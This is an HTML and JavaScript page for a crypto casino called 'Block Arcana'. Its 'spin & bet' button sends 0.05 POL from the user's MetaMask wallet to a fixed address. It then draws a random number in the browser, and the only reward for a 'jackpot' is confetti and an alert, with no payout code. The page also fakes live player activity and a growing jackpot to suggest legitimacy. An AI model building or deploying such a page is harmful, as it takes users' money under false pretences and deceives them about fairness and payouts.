<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Block Arcana | Elite Crypto Casino</title>
    <style>
        :root { --neon: #00ffff; --gold: #ff00ff; --win: #00ff00; }
        body {
            background: radial-gradient(circle at center, #111 0%, #050505 100%);
            background-attachment: fixed; color: #fff;
            font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0;
        }
        .stats-header {
            background: rgba(0, 255, 255, 0.05); border-bottom: 1px solid rgba(0, 255, 255, 0.2);
            padding: 12px; font-size: 0.8em; display: flex; justify-content: space-around;
            backdrop-filter: blur(15px); position: sticky; top: 0; z-index: 100;
        }
        .header {
            font-family: serif; font-style: italic; font-size: 3.5em; margin: 20px 0;
            background: linear-gradient(to right, #fff, var(--gold), var(--neon), #fff);
            background-size: 200% auto; -webkit-background-clip: text;
            -webkit-text-fill-color: transparent; animation: shine 5s linear infinite;
        }
        @keyframes shine { to { background-position: 200% center; } }
        
        /* Jackpot Card Pulsante */
        .jackpot-card {
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 255, 0.1);
            border-radius: 30px; padding: 30px; margin: 20px auto; max-width: 320px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.05);
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { box-shadow: 0 0 10px rgba(0,255,255,0.1); } 50% { box-shadow: 0 0 25px rgba(0,255,255,0.2); } 100% { box-shadow: 0 0 10px rgba(0,255,255,0.1); } }
        
        #jackpotValue { color: var(--win); font-size: 3em; font-weight: bold; text-shadow: 0 0 20px var(--win); margin: 10px 0; }

        /* Bouton Deluxe */
        .btn-bet {
            background: linear-gradient(135deg, var(--gold), #7000ff);
            border: none; padding: 22px 60px; color: white; font-weight: bold;
            border-radius: 60px; cursor: pointer; font-size: 1.3em;
            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.3); transition: 0.3s;
        }
        .btn-bet:disabled { background: #333; cursor: not-allowed; opacity: 0.7; }

        /* Tableau d'activit√© */
        .activity-box {
            background: rgba(255, 255, 255, 0.02); border-radius: 20px;
            margin: 40px auto; max-width: 350px; padding: 15px;
            border: 1px solid rgba(255,255,255,0.05); font-size: 0.8em;
        }
        .activity-item { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); color: #aaa; text-align: left; }
        .activity-item b { color: var(--neon); }

        .btn-scan {
            display: inline-block; margin-top: 20px; padding: 10px 20px;
            background: rgba(255,255,255,0.05); border: 1px solid var(--neon);
            border-radius: 10px; color: var(--neon); text-decoration: none; font-size: 0.7em;
        }
    </style>
</head>
<body>

<div class="stats-header">
    <span>üë• <span id="online-players">28</span> EN LIGNE</span>
    <span>üíé AMOY NETWORK</span>
</div>

<div style="padding: 20px;">
    <h1 class="header">Block Arcana</h1>
    
    <div class="jackpot-card">
        <div style="color: var(--neon); letter-spacing: 3px; font-size: 0.8em;">LIVE JACKPOT</div>
        <h2 id="jackpotValue">0.0500 POL</h2>
        <div style="font-size: 0.7em; color: #888;">MIN BET: 0.05 POL</div>
    </div>

    <button class="btn-bet" id="betButton" onclick="playGame()">SPIN & BET</button>
    <div id="status" style="margin-top: 15px; color: var(--neon); font-weight: bold; height: 20px;"></div>

    <div class="activity-box">
        <div style="font-weight: bold; margin-bottom: 10px; color: #fff;">RECENT ACTIVITY</div>
        <div id="activity-list">
            <div class="activity-item">User <b>0x7a...d2</b> joined the room</div>
            <div class="activity-item">User <b>0x12...f9</b> bet 0.05 POL</div>
        </div>
    </div>

    <a href="https://polygonscan.com/address/0x8e25e9858679f29193233f7d5d9939105408d257" target="_blank" class="btn-scan">üîç VERIFY ON BLOCKCHAIN</a>
    
    <div style="margin-top: 40px; font-size: 0.7em; color: #444;">
        STRICTLY DECENTRALIZED PROTOCOL v3.0<br>NO SIGN-UP REQUIRED.
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

<script>
    let currentJackpot = 0.0500;
    const btn = document.getElementById("betButton");
    const status = document.getElementById("status");

    function addActivity(text) {
        const list = document.getElementById("activity-list");
        const item = document.createElement("div");
        item.className = "activity-item";
        item.innerHTML = text;
        list.prepend(item);
        if(list.children.length > 4) list.removeChild(list.lastChild);
    }

    // Simulation de vie
    setInterval(() => {
        const users = ["0x88...12", "0x45...e4", "0xbc...d8", "0x33...a1"];
        const user = users[Math.floor(Math.random()*users.length)];
        addActivity(`User <b>${user}</b> just placed a bet`);
    }, 12000);

    async function playGame() {
        if (!window.ethereum) return alert("Please open in MetaMask");
        
        try {
            btn.disabled = true;
            status.innerText = "WAITING FOR WALLET...";
            
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            
            const tx = { to: "0x8e25e9858679f29193233f7d5d9939105408d257", value: ethers.utils.parseEther("0.05") };
            const transaction = await signer.sendTransaction(tx);
            
            status.innerText = "ROLLING THE DESTINY...";
            await transaction.wait();

            // EFFET DE SUSPENSE (3 secondes)
            let count = 0;
            const interval = setInterval(() => {
                status.innerText = ["üé≤ SPINNING.", "üé≤ SPINNING..", "üé≤ SPINNING..."][count % 3];
                count++;
            }, 500);

            setTimeout(() => {
                clearInterval(interval);
                btn.disabled = false;
                const roll = Math.floor(Math.random() * 50) + 1;
                
                if (roll === 7) {
                    confetti({ particleCount: 200, spread: 90 });
                    status.innerText = "üé∞ JACKPOT !!!";
                    alert("CONGRATULATIONS! YOU WON!");
                } else {
                    status.innerText = "NOT THIS TIME";
                    currentJackpot += 0.05;
                    document.getElementById("jackpotValue").innerText = currentJackpot.toFixed(4) + " POL";
                    addActivity("<b>Jackpot</b> increased to " + currentJackpot.toFixed(2) + " POL");
                }
            }, 3000);

        } catch (e) {
            btn.disabled = false;
            status.innerText = "ERROR OR CANCELLED";
        }
    }
</script>
</body>
</html>
